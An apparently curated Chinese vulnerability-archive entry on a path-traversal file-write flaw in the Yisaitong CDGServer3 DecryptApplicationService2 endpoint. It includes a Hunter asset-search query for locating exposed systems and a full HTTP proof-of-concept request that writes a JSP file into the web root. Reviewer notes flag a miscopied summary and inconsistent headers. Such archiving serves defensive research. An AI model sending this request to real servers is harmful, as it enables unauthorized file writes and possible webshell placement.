---
source: "wy876 漏洞文库"
title: "亿赛通CDGServer3 DecryptApplicationService2 fileId遍历写文件"
product: "亿赛通CDGServer3"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "固定Windows Program Files(x86)安装路径；版本未知"
prerequisites: "请求带JSESSIONID"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gbd5spifnesrczm0"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDecryptApplicationService2%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-5682fefaab945c27a6b48c10"
entity_id: "ve-5682fefaab945c27a6b48c10"
schema_version: "1"
---

# 亿赛通CDGServer3 DecryptApplicationService2 fileId遍历写文件

## 条目说明

- 对象与具体问题：亿赛通CDGServer3；DecryptApplicationService2 fileId遍历写文件
- 版本、配置及部署条件：固定Windows Program Files(x86)安装路径；版本未知
- 认证与权限前提：请求带JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 漏洞简介末尾仍是ClientAjax任意文件下载，明显复制错题
- pentest纯文本写JSP不证明执行，需别把文件写入直接当RCE
- Content-Length11与pentest六字符不符，重复User-Agent/Accept，Host全角说明需清理
- 安装目录/权限、鉴权及写入结果均未证；与Service1反序列化不同缺陷

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通 电子文档安全管理系统 ClientAjax 任意文件下载。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
```http
POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/pentest.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host:  IP：PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=B******************************4
Upgrade-Insecure-Requests: 1

pentest
```

> 请求长度说明：原资料 Content-Length 为 11；静态长度已移除，应由客户端根据最终请求体的字节数生成。


文件地址：/CDGServer3/pentest.jsp


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gbd5spifnesrczm0>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
